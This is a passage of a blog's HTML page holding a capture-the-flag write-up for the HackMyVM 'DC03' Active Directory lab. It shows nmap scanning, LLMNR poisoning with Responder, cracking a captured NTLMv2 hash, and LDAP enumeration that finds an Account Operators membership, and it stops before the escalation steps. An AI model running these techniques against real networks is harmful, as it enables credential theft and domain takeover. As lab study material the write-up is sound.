@@ -1,0 +1,1689 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>DC03 — HackMyVM &middot; k40t1k</title>
+    <meta name="title" content="DC03 — HackMyVM &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/posts/dc03-hackmyvm/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/dc03-hackmyvm/">
+  <meta property="og:site_name" content="k40t1k">
+  <meta property="og:title" content="DC03 — HackMyVM">
+  <meta property="og:description" content="My awesome website">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-11T18:43:53+03:00">
+    <meta property="article:modified_time" content="2026-06-11T18:43:53+03:00">
+    <meta property="article:tag" content="Active Directory">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="LLMNR Poisoning">
+    <meta property="article:tag" content="Account Operators">
+    <meta property="article:tag" content="Impacket">
+    <meta property="article:tag" content="Responder">
+    <meta property="og:image" content="http://localhost:1313/posts/dc03-hackmyvm/feature.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/posts/dc03-hackmyvm/feature.png">
+  <meta name="twitter:title" content="DC03 — HackMyVM">
+  <meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "DC03 — HackMyVM",
+    "headline": "DC03 — HackMyVM",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/dc03-hackmyvm\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-06-11T18:43:53\u002b03:00",
+    "datePublished": "2026-06-11T18:43:53\u002b03:00",
+    
+    "dateModified": "2026-06-11T18:43:53\u002b03:00",
+    
+    "keywords": ["Active Directory","Privilege Escalation","LLMNR Poisoning","Account Operators","Impacket","Responder","CTF Writeup"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "898"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Dc03 — Hack My Vm",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certifications/"
+                  title="Certifications"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certifications</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        DC03 — HackMyVM
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-06-11 18:43:53 &#43;0300 EAT">11 June 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/feature_hu_267683bec75be75f.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/feature_hu_e2692d2fd7800ac7.webp 660w
+            
+              ,http://localhost:1313/posts/dc03-hackmyvm/feature_hu_e51a0944e0df900.webp 1024w
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/feature_hu_f600942903c1688c.webp 1216w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1216"
+        height="528"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/feature_hu_9680af66071de9f.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/feature_hu_e85feee10e7851f0.png 330w,http://localhost:1313/posts/dc03-hackmyvm/feature_hu_9680af66071de9f.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/feature_hu_3083fcb6baa17b45.png 1024w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/feature.png 1216w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#step-1-reconnaissance-and-enumeration">Step 1: Reconnaissance and Enumeration</a></li>
+    <li><a href="#step-2-initial-access">Step 2: Initial Access</a>
+      <ul>
+        <li><a href="#executing-responder">Executing Responder</a></li>
+        <li><a href="#capturing-and-cracking-the-hash">Capturing and Cracking the Hash</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-3-internal-domain-enumeration">Step 3: Internal Domain Enumeration</a>
+      <ul>
+        <li><a href="#smb-share-enumeration">SMB Share Enumeration</a></li>
+        <li><a href="#ldap-enumeration">LDAP Enumeration</a></li>
+        <li><a href="#identifying-the-vulnerability">Identifying the Vulnerability</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-4-privilege-escalation">Step 4: Privilege Escalation</a>
+      <ul>
+        <li><a href="#resetting-the-target-password">Resetting the Target Password</a></li>
+        <li><a href="#verifying-access">Verifying Access</a></li>
+      </ul>
+    </li>
+    <li><a href="#step-5-domain-compromise">Step 5: Domain Compromise</a>
+      <ul>
+        <li><a href="#dumping-ntdsdit">Dumping NTDS.dit</a></li>
+        <li><a href="#remote-administration">Remote Administration</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>This writeup details the attack path taken to compromise the SOUPEDECODE.LOCAL Active Directory domain. The attack chain consisted of LLMNR poisoning to capture initial credentials, LDAP enumeration to discover a misconfigured high-privileged group membership (Account Operators), and an orchestrated password reset to ultimately dump the domain controller&rsquo;s NTDS.dit file and gain Admin access via WinRM.</p>
+<h2 id="step-1-reconnaissance-and-enumeration" class="relative group">Step 1: Reconnaissance and Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-1-reconnaissance-and-enumeration" aria-label="Anchor">#</a></span></h2><p>The assessment began with an nmap scan against the target IP (192.168.56.106) to identify running services and potential entry points.</p>
+<pre tabindex="0"><code>nmap -sV -sC -p- 192.168.56.106
+</code></pre><pre tabindex="0"><code>PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 128 Simple DNS Plus
+88/tcp    open  kerberos-sec  syn-ack ttl 128 Microsoft Windows Kerberos (server time: 2026-06-11 18:43:53Z)
+135/tcp   open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 128
+464/tcp   open  kpasswd5?     syn-ack ttl 128
+593/tcp   open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+3268/tcp  open  ldap          syn-ack ttl 128 Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL, Site: Default-First-Site-Name)
+5985/tcp  open  http          syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        syn-ack ttl 128 .NET Message Framing
+49664/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49668/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+49670/tcp open  ncacn_http    syn-ack ttl 128 Microsoft Windows RPC over HTTP 1.0
+49683/tcp open  msrpc         syn-ack ttl 128 Microsoft Windows RPC
+</code></pre><p><strong>Key Findings:</strong></p>
+<ul>
+<li>Standard Active Directory ports were open, including DNS (53), Kerberos (88), RPC (135), SMB (139/445), and LDAP (389/3268).</li>
+<li>The domain was identified as SOUPEDECODE.LOCAL.</li>
+<li>A check for anonymous/null session access over SMB yielded no results.</li>
+</ul>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_6177d94fdd0f6ad8.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_1c8a46e317040d42.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_588e7edb19d4d321.webp 963w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_588e7edb19d4d321.webp 963w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="963"
+        height="79"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_4ca646df51a40e0c.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_90777f25d1f7c588.png 330w,http://localhost:1313/posts/dc03-hackmyvm/no-null-session_hu_4ca646df51a40e0c.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/no-null-session.png 963w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/no-null-session.png 963w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Initial user enumeration was attempted using Kerbrute, setting the stage for further attacks.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_a9962ad78a8d326a.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_d574befc25003685.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_60380cf98debf234.webp 802w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_60380cf98debf234.webp 802w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="802"
+        height="344"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_106ee4bf47bcf480.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_e28aa32ada49c2e.png 330w,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum_hu_106ee4bf47bcf480.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum.png 802w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/kerbrute-user-enum.png 802w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><p>With SMB signing enabled, an SMB relay attack was not viable. The strategy pivoted to capturing authentication hashes over the local network using LLMNR/NBT-NS poisoning.</p>
+<h3 id="executing-responder" class="relative group">Executing Responder <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#executing-responder" aria-label="Anchor">#</a></span></h3><p>Responder was started on the local interface to listen for and poison multicast queries.</p>
+<pre tabindex="0"><code>responder -I vboxnet0 -dwv
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_9a959e9fc0bdc61c.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_cd235deb826f94f7.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_5b907c91bf4b4876.webp 996w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_5b907c91bf4b4876.webp 996w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="996"
+        height="692"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_2c85f5d11de2139.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_ecf946ef69c73afa.png 330w,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr_hu_2c85f5d11de2139.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr.png 996w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/responder-llmnr.png 996w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="capturing-and-cracking-the-hash" class="relative group">Capturing and Cracking the Hash <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#capturing-and-cracking-the-hash" aria-label="Anchor">#</a></span></h3><p>The poisoning attack successfully intercepted an authentication request, yielding an NTLMv2 hash for the user <code>xkate578</code>. Using a password cracking tool (such as Hashcat or John the Ripper), the captured hash was successfully cracked to reveal the plaintext password.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_d3fb9b4112ecff83.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_83d0346da948d56d.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_af8b70ca820f20bd.webp 787w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_af8b70ca820f20bd.webp 787w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="787"
+        height="151"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_339f81ea2064eec6.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_171de1d6a4eda9d7.png 330w,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash_hu_339f81ea2064eec6.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash.png 787w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/cracked-hash.png 787w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-internal-domain-enumeration" class="relative group">Step 3: Internal Domain Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-internal-domain-enumeration" aria-label="Anchor">#</a></span></h2><p>Armed with valid credentials for <code>xkate578</code>, the next phase focused on mapping out internal access and identifying paths for privilege escalation.</p>
+<h3 id="smb-share-enumeration" class="relative group">SMB Share Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#smb-share-enumeration" aria-label="Anchor">#</a></span></h3><p>Initial checks of the SMB shares showed accessible directories.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_271d9833ece757be.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_23792d5a66c4ce0e.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_2cb9d86871b71687.webp 951w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_2cb9d86871b71687.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="127"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_cefbeb768e70bb94.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_ecfaf2ef68e7f0f2.png 330w,http://localhost:1313/posts/dc03-hackmyvm/smb-shares_hu_cefbeb768e70bb94.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/smb-shares.png 951w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/smb-shares.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_a6df780b09717104.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_3dec9d155da0bab5.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_4d2f533ac6cf8a74.webp 666w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_4d2f533ac6cf8a74.webp 666w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="666"
+        height="157"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_5bc912158767bbc9.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_b8b1920a4c20fd34.png 330w,http://localhost:1313/posts/dc03-hackmyvm/smb-access_hu_5bc912158767bbc9.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/smb-access.png 666w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/smb-access.png 666w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Slinkey was run against the shares in an attempt to harvest additional hashes or sensitive files, but this did not yield actionable results.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_2c69267e2b0d72a4.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_ed4d7f7f0192d5e8.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_388eb259056b1100.webp 920w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_388eb259056b1100.webp 920w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="920"
+        height="258"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_dabf2dc8f8e5642e.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_21b614a2393b7d30.png 330w,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt_hu_dabf2dc8f8e5642e.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt.png 920w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/slinkey-attempt.png 920w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="ldap-enumeration" class="relative group">LDAP Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ldap-enumeration" aria-label="Anchor">#</a></span></h3><p>To get a broader view of the domain&rsquo;s structure and permissions, <code>ldapdomaindump</code> was utilized.</p>
+<pre tabindex="0"><code>ldapdomaindump -n 192.168.56.106 -u &#39;SOUPEDECODE.LOCAL\xkate578&#39; -p &#39;&lt;Cracked_Password&gt;&#39; -o ldap_dump 192.168.56.106
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_68512a3314435562.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_eec5ec6419a0707.webp 660w
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_5aee7f57d4415942.webp 753w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_5aee7f57d4415942.webp 753w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="753"
+        height="111"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_ff135378c7ce2324.png" srcset="http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_e99fe966d2f09db4.png 330w,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump_hu_ff135378c7ce2324.png 660w
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump.png 753w
+          
+          
+            ,http://localhost:1313/posts/dc03-hackmyvm/ldap-domain-dump.png 753w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="identifying-the-vulnerability" class="relative group">Identifying the Vulnerability <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#identifying-the-vulnerability" aria-label="Anchor">#</a></span></h3><p>Reviewing the output from the LDAP dump revealed a critical misconfiguration: the user <code>xkate578</code> was a member of the <strong>Account Operators</strong> group.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_7a34da555f127466.webp 330w,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_81b5cd8bbcdccd78.webp 660w
+            
+              ,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_40b2aa5cd81b181c.webp 1024w
+            
+            
+              ,http://localhost:1313/posts/dc03-hackmyvm/account-operators_hu_8c2b07367a999b4d.webp 1320w
+            "
+          
